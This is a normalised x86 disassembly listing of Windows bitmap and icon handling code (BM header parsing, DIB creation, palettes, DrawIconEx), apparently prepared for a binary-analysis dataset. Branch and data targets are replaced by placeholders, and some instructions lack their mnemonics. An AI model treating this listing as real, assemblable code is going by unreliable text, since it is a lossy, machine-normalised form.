cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_421a30
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_415510
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_4220e4
pop esi
pop ebx
retn
sub_421a54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421adb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_421b3b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_4205c8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_4205c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421b42
push rw-data
call LeaveCriticalSection
retn
sub_421b54
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_4220e4
pop edx
pop edi
pop esi
pop ebx
retn
sub_421b7c
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026bc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_422099
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_42206c
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b3c
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41d778
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4157ac
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402b3c
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41573c
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41da08
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41da28
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41573c
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41d898
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_421fe7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41dcd0
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026bc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_421f4f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41573c
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41d898
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_421f23
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41df88
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40c714
call sub_41d778
jmp r-xdata
xor eax eax
push ebp
push sub_421fb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41573c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421f2a
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421fee
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40c714
call sub_41d778
jmp r-xdata
sub_421f2a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_421fee
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402b3c
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_422083
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41df88
mov [ ebp - 0x30 ] eax
sub_4220a0
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_421a54
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4220e4
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4217e4
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41573c
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402b3c
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_421a54
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_421b7c
call sub_41d778
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_422154
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_4217e4
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b3c
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_420dfc
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_4221ef
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_421a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_422218
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_4216a0
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_4217e4
mov eax esi
call sub_4218f4
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_4217e4
mov eax esi
call sub_4218f4
mov eax esi
call sub_421770
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_420dfc
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_421200
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_421a54
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_421a54
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_420798
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_422350
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4217f4
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_421200
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4223a4
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4217f4
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_421200
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_422424
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_4217e4
mov eax ebx
call sub_4217f4
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_420798
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4224bb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_421a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_420690
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41b7cc
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_4224c0
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_4038dc
call sub_403930
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_420690
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4224f8
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_4217f4
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_421200
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_422548
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4217f4
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_421200
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4225a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b3c
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_421770
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41e6dc
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415774
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415774
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b3c
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_421634
mov dl [ r-xdata ]
call sub_41d574
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41d898
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_42074c
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415774
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_415774
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415774
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_415774
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_415774
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_415774
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41dd08
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_415774
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41e02c
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_422864
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_4217f4
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_420798
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_4228de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_420dfc
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422904
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_42294c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41ea18
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_4205c4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_4229a0
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_4205c8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e48
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_4229d0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_422ca8
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_4205c4
mov eax [ esi + 0x28 ]
call sub_4205c8
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_413e74
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_422a30
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41d574
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_422a88
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_422ac4
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
